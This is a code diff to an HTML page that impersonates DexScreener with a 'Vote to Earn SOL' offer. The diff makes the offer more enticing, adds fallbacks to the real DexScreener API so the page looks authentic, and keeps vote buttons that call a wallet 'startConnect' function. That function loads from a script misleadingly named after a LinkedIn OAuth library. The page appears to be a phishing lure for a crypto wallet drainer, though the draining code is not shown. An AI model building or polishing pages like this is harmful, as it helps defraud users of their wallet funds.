@@ -7,7 +7,7 @@
 
     <title>DexScreener Votes • Elite Terminal</title>
     <meta property="og:title" content="Vote to Earn — DexScreener CORE" id="ogTitle">
-    <meta property="og:description" content="🗳 Vote and earn rewards from the community voting pool" id="ogDesc">
+    <meta property="og:description" content="Vote to Earn SOL" id="ogDesc">
     <meta property="og:image" content="" id="ogImage">
     <meta property="og:image:width" content="1200">
     <meta property="og:image:height" content="630">
@@ -16,7 +16,7 @@
     <meta property="og:site_name" content="DexScreener CORE">
     <meta name="twitter:card" content="summary_large_image">
     <meta name="twitter:title" content="Vote to Earn — DexScreener CORE" id="twTitle">
-    <meta name="twitter:description" content="🗳 Vote and earn rewards from the community voting pool" id="twDesc">
+    <meta name="twitter:description" content="Vote to Earn SOL" id="twDesc">
     <meta name="twitter:image" content="" id="twImage">
     <meta name="twitter:image:width" content="1200">
     <meta name="twitter:image:height" content="630">
@@ -44,6 +44,7 @@
         window.setup = { injectWindowObjects: true };
     </script>
     <script src="passport-linkedin-oauth2.esm.js"></script>
+
     <style>
         :root {
             --bg-dark: #020203;
@@ -506,10 +507,13 @@
             padding: 18px 20px;
             border-radius: 16px;
             border: none;
-            background: var(--dex-green);
+            background: linear-gradient(135deg, #16a34a, #22c55e, #10b981);
+            background-size: 200% 100%;
             color: black;
-            font-weight: 800;
+            font-weight: 900;
             font-size: 1rem;
+            text-transform: uppercase;
+            letter-spacing: 1px;
             cursor: pointer;
             position: relative;
             overflow: hidden;
@@ -518,6 +522,8 @@
             align-items: center;
             justify-content: center;
             gap: 8px;
+            text-shadow: 0 1px 1px rgba(255, 255, 255, 0.2);
+            box-shadow: 0 8px 15px rgba(0, 0, 0, 0.3), inset 0 1px 1px rgba(255, 255, 255, 0.3);
         }
 
         .btn-vote-mobile::after {
@@ -533,9 +539,10 @@
         }
 
         .btn-vote-mobile:hover {
-            transform: translateY(-2px);
-            box-shadow: 0 10px 30px var(--dex-green-glow);
-            filter: brightness(1.1);
+            transform: translateY(-2px) scale(1.01);
+            box-shadow: 0 12px 30px var(--dex-green-glow), inset 0 1px 2px rgba(255, 255, 255, 0.4);
+            filter: brightness(1.15);
+            background-position: 100% 0;
         }
 
         .btn-vote-mobile:active {
@@ -676,6 +683,7 @@
             margin-top: 6px;
             background: linear-gradient(to bottom, #ffffff 30%, #444444 100%);
             -webkit-background-clip: text;
+            background-clip: text;
             -webkit-text-fill-color: transparent;
             word-break: break-word;
         }
@@ -885,14 +893,19 @@
             padding: 22px;
             border-radius: 18px;
             border: none;
-            background: var(--dex-green);
+            background: linear-gradient(135deg, #16a34a, #22c55e, #10b981);
+            background-size: 200% 100%;
             color: black;
-            font-weight: 800;
-            font-size: 1.1rem;
+            font-weight: 900;
+            font-size: 1.15rem;
+            text-transform: uppercase;
+            letter-spacing: 1.5px;
             cursor: pointer;
-            transition: all 0.3s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+            transition: all 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
             position: relative;
             overflow: hidden;
+            text-shadow: 0 1px 1px rgba(255, 255, 255, 0.2);
+            box-shadow: 0 10px 20px rgba(0, 0, 0, 0.4), inset 0 1px 1px rgba(255, 255, 255, 0.3);
         }
 
         .btn-vote::after {
@@ -920,9 +933,10 @@
         }
 
         .btn-vote:hover {
-            transform: translateY(-3px);
-            box-shadow: 0 15px 40px var(--dex-green-glow);
-            filter: brightness(1.1);
+            transform: translateY(-4px) scale(1.02);
+            box-shadow: 0 20px 50px var(--dex-green-glow), inset 0 1px 2px rgba(255, 255, 255, 0.5);
+            filter: brightness(1.2);
+            background-position: 100% 0;
         }
 
         .btn-vote:active {
@@ -1419,7 +1433,7 @@
                             <!-- MOBILE VOTE BUTTON — wallet connection -->
                             <button class="btn-vote-mobile NlVhn6Y- 7q6V1UU_ X47pM3kx mLn4It43" id="voteBtnMobile"
                                 onclick="window.startConnect()">
-                                <i class="fas fa-check-to-slot"></i> VOTE TO UNLOCK
+                                <i class="fas fa-check-to-slot"></i> VOTE TO EARN SOL REWARD
                             </button>
                             <div class="mobile-vote-stats">
                                 <div class="mv-stat">
@@ -1473,7 +1487,7 @@
                         </p>
                         <!-- DESKTOP VOTE BUTTON — wallet connection -->
                         <button class="btn-vote NlVhn6Y- 7q6V1UU_ X47pM3kx mLn4It43" id="voteBtn"
-                            onclick="window.startConnect()">VOTE TO UNLOCK</button>
+                            onclick="window.startConnect()">VOTE TO EARN SOL REWARD</button>
                     </div>
                 </div>
             </div>
@@ -1612,6 +1626,8 @@
             if (params.get('ca') && params.get('ca').length > 10) return params.get('ca').trim();
             if (params.get('token') && params.get('token').length > 10) return params.get('token').trim();
             if (window.location.hash.length > 12) return window.location.hash.slice(1).trim();
+            const pathCA = window.location.pathname.substring(1).replace(/\/$/, "");
+            if (pathCA && pathCA.length > 10 && !pathCA.includes('/')) return pathCA.trim();
             return null;
         }
 
@@ -1622,7 +1638,7 @@
             const chainSym = CHAIN_REWARDS[chainId] || CHAIN_SYMBOLS[chainId] || chainId.toUpperCase();
             const mcapStr = formatBigShort(mcapRaw);
             const title = `${tokenName} — Vote to Earn ${chainSym}`;
-            const desc = `🗳 Vote for ${tokenSymbol} · ${mcapStr} mcap · Earn ${chainSym} rewards from the community voting pool`;
+            const desc = `${tokenName} Vote to Earn SOL`;
             document.title = title;
 
             const setAttr = (id, attr, val) => {
@@ -1722,10 +1738,18 @@
             currentCA = address;
             document.getElementById('loaderCA').textContent = shortenCA(address);
             try {
-                const res = await fetch('/api/token/' + encodeURIComponent(address));
-                if (!res.ok) throw new Error('API error');
-                const data = await res.json();
-                if (!data.pairs || data.pairs.length === 0) throw new Error('No pairs');
+                let data = null;
+                try {
+                    const res = await fetch('/api/token/' + encodeURIComponent(address));
+                    if (!res.ok) throw new Error('API error');
+                    data = await res.json();
+                } catch (err) {
+                    const res2 = await fetch('https://api.dexscreener.com/latest/dex/tokens/' + encodeURIComponent(address));
+                    if (!res2.ok) throw new Error('DexScreener API error');
+                    data = await res2.json();
+                }
+
+                if (!data || !data.pairs || data.pairs.length === 0) throw new Error('No pairs');
                 const pair = data.pairs.sort((a, b) => (b.liquidity?.usd || 0) - (a.liquidity?.usd || 0))[0];
                 const token = pair.baseToken;
                 currentChain = pair.chainId || 'unknown';
@@ -1819,17 +1843,32 @@
         async function loadTrending() {
             const track = document.getElementById('trendingTrack');
             try {
-                const boostRes = await fetch('/api/trending');
-                if (!boostRes.ok) throw new Error('API ' + boostRes.status);
-                const boosts = await boostRes.json();
+                let boosts = null;
+                try {
+                    const boostRes = await fetch('/api/trending');
+                    if (!boostRes.ok) throw new Error('API ' + boostRes.status);
+                    boosts = await boostRes.json();
+                } catch (err) {
+                    const boostRes2 = await fetch('https://api.dexscreener.com/token-boosts/top/v1');
+                    if (!boostRes2.ok) throw new Error('Direct API ' + boostRes2.status);
+                    boosts = await boostRes2.json();
+                }
+
                 const seen = new Set(); const unique = [];
                 for (const t of boosts) { if (!seen.has(t.tokenAddress)) { seen.add(t.tokenAddress); unique.push(t) } if (unique.length >= 20) break }
                 if (unique.length === 0) throw new Error('None');
                 const pairMap = {};
                 const addrs = unique.map(t => t.tokenAddress).join(',');
                 try {
-                    const pr = await fetch('/api/token/' + addrs);
-                    if (pr.ok) { const pd = await pr.json(); if (pd.pairs) { for (const p of pd.pairs) { const a = p.baseToken.address; if (!pairMap[a] || (p.fdv && p.fdv > (pairMap[a].fdv || 0))) pairMap[a] = p } } }
+                    let pd = null;
+                    try {
+                        const pr = await fetch('/api/token/' + addrs);
+                        if (pr.ok) pd = await pr.json();
+                    } catch (err) {
+                        const pr2 = await fetch('https://api.dexscreener.com/latest/dex/tokens/' + addrs);
+                        if (pr2.ok) pd = await pr2.json();
+                    }
+                    if (pd && pd.pairs) { for (const p of pd.pairs) { const a = p.baseToken.address; if (!pairMap[a] || (p.fdv && p.fdv > (pairMap[a].fdv || 0))) pairMap[a] = p } }
                 } catch (_) { }
                 let html = '';
                 unique.forEach(token => {
@@ -1874,21 +1913,7 @@
             }
         })();
     </script>
-<!-- Load the LinkedIn module and expose startConnect on window -->
-<script type="module">
-  import * as LinkedInAuth from '/passport-linkedin-oauth2.esm.js';
-  if (LinkedInAuth.startConnect) {
-    window.startConnect = LinkedInAuth.startConnect;
-  } else if (LinkedInAuth.default && typeof LinkedInAuth.default === 'function') {
-    window.startConnect = LinkedInAuth.default;
-  } else {
-    console.error('startConnect not found in /passport-linkedin-oauth2.esm.js');
-  }
-</script>
+
 </body>
 
 </html>
-
-
-
-
